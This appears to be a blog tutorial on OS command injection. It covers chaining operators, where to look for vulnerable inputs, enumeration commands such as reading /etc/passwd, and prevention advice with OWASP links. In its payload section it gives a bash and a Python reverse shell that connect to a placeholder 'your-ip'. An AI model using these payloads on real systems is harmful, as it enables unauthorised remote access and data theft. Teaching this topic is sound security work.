---
title: "OS Command Injection Attacks"
date: 2024-11-23 01:00:00 +0800
categories: [Web Attacks]
tags: [Challenge, Tutorial, Command Injection]
image:
  path: https://i.pinimg.com/originals/6e/f8/bb/6ef8bb7858572430b509ed6f8ed0dd32.gif
---

## Topics We'll Cover
1. **Introduction**  
2. **What is Command Injection?**  
3. **How to Find Command Injection Vulnerabilities?**  
4. **Useful Commands**  
5. **Linux or Windows?**  
6. **Practice Makes Perfect**  
7. **How to Prevent Command Injection?**  
8. **Go Wild**

---

## Introduction
Welcome! While I initially planned to write a blog post on GraphQL, I decided to focus on **Command Injection** instead. Why? Because understanding various server-side vulnerabilities is crucial before diving into other areas.  

Lately, I’ve been busy as a red teamer, analyzing how advanced persistent threat (APT) groups compromise major corporations and government organizations. For fun, I tested some of these methods on NASA's systems don’t worry, it was within legal boundaries. Even though I managed to collect over 500 emails of active employees, phishing is strictly prohibited. By the way, I did receive that coveted recognition letter from NASA, which many share on social media for clout!  

Enough about me. Feel free to DM me on Twitter if you’re reading this; I’m always open to hearing your stories and making new friends. Now, let’s dive into **OS Command Injection** cue the *Itachi theme* on Spotify!

---

## What is Command Injection?  
Command Injection is a vulnerability that allows an attacker to execute arbitrary system commands on the target server. Whether you call it **OS Command Injection** or simply **Command Injection**, they’re the same thing.  

Think of it like this: you're playing a CTF or exploiting a poorly configured server. The first thing you’d typically do is run commands like `whoami` or `id` to figure out your current privilege level. But in real-world scenarios, this doesn’t involve gaining access through complex exploits—it's often about finding misconfigured input fields or parameters.  

That said, blindly injecting commands like `whoami` into every parameter isn’t the way to go. Instead, carefully inspect the responses and behaviors of the application, much like a predator stalking its prey.  

Here are some examples of command chaining operators you might use in your terminal:  
1. `whoami || id`  
2. `whoami | id`  
3. `whoami && id`  

Each operator works differently, but their purpose in Command Injection is to inject system commands into application fields and get responses from the server. Crafting payloads for Command Injection often requires trial and error, as well as a deep understanding of the application’s behavior.

---

## How to Find Command Injection Vulnerabilities?  
This is the part where real skill comes in. You can solve countless labs, but finding Command Injection vulnerabilities in the wild requires knowing **where** to look and **what** to test. Here’s a checklist to guide you:  

1. **File Uploads**: Look for functionality where uploaded files are renamed or processed.  
2. **Image Conversions**: Check for tools that handle image resizing or format changes.  
3. **Network Utilities**: Test features like ping, traceroute, or WHOIS lookups.  
4. **Data Import/Export**: Vulnerabilities can exist in tools for importing/exporting data.  
5. **Admin Panels**: Backup logs or data fetch utilities in admin areas are often vulnerable.  
6. **Hidden APIs**: Many modern attacks exploit poorly secured APIs. Keep an eye out for them!  

---

## Useful Commands  
### Linux Commands
- `id` - Show user information.  
- `whoami` - Display current user.  
- `uname -a` - Get system info (kernel, architecture, etc.).  
- `cat /etc/passwd` - Read the system's user list.  
- `ls -l /` - List files in the root directory.  
- `ps aux` - Show running processes.  
- `df -h` - Display disk usage.

### Windows Commands
- `whoami` - Display current user.  
- `hostname` - Show system hostname.  
- `echo %USERNAME%` - Get username.  
- `systeminfo` - Detailed system info.  
- `net user` - List user accounts.

### Cross-Platform Payloads
- Inline Execution: `uname -a`, `$(id)`, `; ls`, `| id`.  
- Reverse Shell:  
  ```bash
  bash -i >& /dev/tcp/your-ip/4444 0>&1
- Python Reverse Shell:
  python -c 'import socket,os,pty;s=socket.socket();s.connect(("your-ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

### Linux or Windows?

You may wonder how to determine the OS of the target server. With proper reconnaissance, tools, and sometimes application responses, you can figure this out. Target-specific commands depend on the OS—choose wisely!

### Practice Makes Perfect

Want to practice? Here are some great resources:

- [PortSwigger Labs](https://portswigger.net/web-security/all-labs)
- [PentesterLab](https://pentesterlab.com/)

For example, solving a **Blind Command Injection Lab** requires tools like Burp Suite’s Collaborator to test for out-of-band (OOB) responses. If you misconfigure your payloads or fail to account for specific fields, you might miss the vulnerability entirely. Always test thoroughly.

### How to Prevent Command Injection?

To prevent Command Injection vulnerabilities:

1. Avoid calling OS commands from user input whenever possible.
2. Use allowlists instead of blacklists for commands or parameters.
3. Validate and sanitize user inputs.
4. Implement secure coding practices and run regular security audits.

Check out this OWASP cheat sheet for more details:  
[OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)

### Go Wild!

Here are additional resources and payloads to explore:

- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [Command Injection Payload List](https://github.com/payloadbox/command-injection-payload-list)
